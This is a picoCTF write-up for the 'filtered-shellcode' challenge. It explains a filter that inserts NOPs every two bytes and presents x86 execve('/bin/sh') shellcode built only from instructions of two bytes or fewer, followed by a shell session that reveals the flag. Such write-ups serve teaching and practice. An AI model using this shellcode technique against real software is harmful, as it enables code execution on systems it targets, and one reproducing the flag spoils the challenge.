# filtered-shellcode

Shellcode

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/filtered-shellcode/fun'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

The checksec does not really matter since the binary will execute the input for us as machine instructions. 

## Concept

The concept is to provide shellcode to the binary that uses instructions which are at most 2-byte long. The binary will execute the shellcode for us. 

## Filter

The filter is applied in the `execute` function, with the following code segment (taken from Ghidra, with variable renames)

```c
void execute(..., ...){
  
  ...

  j = 0;
  for (i = 0; i < buf_len_times2_1; i = i + 1) {
    if ((int)i % 4 < 2) {
      auStack_2c[i + iVar1] = buf[j];
      j = j + 1;
    }
    else {
      auStack_2c[i + iVar1] = 0x90;
    }
  }

  ...

}
```

`auStack_2c` is where the edited shellcode is stored, and `buf` is our input where the original shellcode resides. 

To summarize the mechanism, before execution, `execute` separates the provided shellcode into 2-byte chunks and injects 2-byte NOP slides between every chunk. This renders unpredictable any instruction that is more than 2 bytes long, effectively preventing those instructions from being used. 

One byte instructions have to be NOP-appended or paired with another one-byte instruction to ensure that the subsequent two-byte instruction (if any) is not split apart. 

## API Requirements for `execve('/bin/sh')`

See the [corresponding section in the ropfu writeup](../ropfu/solve.md#api-requirements-for-execvebinsh)

However, this time, through trial-and-error, it is found that we need to set `edx` to 0 (it cannot be the value that occurs at runtime). 

## Pushing "/bin/sh\x00" onto the Stack

We can't push individual bytes onto the stack, and pushing 2 bytes at once takes too many instructions, so we need to package "/bin/sh\x00" into 4-byte chunks (stored in a register, and I chose to use `eax`) for pushing. 

To achieve this with instructions at most 2 bytes long, for each 4-byte chunk, the following is done
1. Set `al` to the last byte in the chunk
2. Shift `eax` left by 8
3. Repeat steps 1 and 2 until the 4-byte chunk is stored in `eax`
    - Note that step 2 only needs to be done thrice, not four times
4. Push `eax`
    - This is an unpaired one-byte instruction, so we append a NOP to it

Note, however, that shifting a register left by any value greater than 1 is an instruction that will require more than 2 bytes. Thus, for step 2, instead of using `shl eax, 0x8`, we perform `shl eax, 0x1` eight times. 

## Shellcode

The shellcode is long because the instructions involving the pushing of "/bin/sh\x00" are very repetitive. They have been omitted to highlight the other operations. 

Additionally, `nop` instructions have been added to ensure that every 1-byte instruction is paired. This then ensures that no 2-byte instruction is split apart. 

```x86asm
0:  b0 00                   mov    al,0x0  ; Push "/bin/sh\x00"
2:  d1 e0                   shl    eax,1
4:  d1 e0                   shl    eax,1

...

6c: d1 e0                   shl    eax,1
6e: d1 e0                   shl    eax,1
70: b0 2f                   mov    al,0x2f
72: 50                      push   eax
73: 90                      nop
74: 54                      push   esp      ; ebx -> "/bin/sh\x00"
75: 5b                      pop    ebx
76: 31 c0                   xor    eax,eax  ; eax = 0xb
78: b0 0b                   mov    al,0xb
7a: 31 c9                   xor    ecx,ecx  ; ecx = 0x0
7c: 31 d2                   xor    edx,edx  ; edx = 0x0
7e: cd 80                   int    0x80
```

## Flag

```bash
[+] Opening connection to mercury.picoctf.net on port 26072: Done
[*] Switching to interactive mode
$ cat flag.txt
picoCTF{th4t_w4s_fun_bb572e7da674111e}
```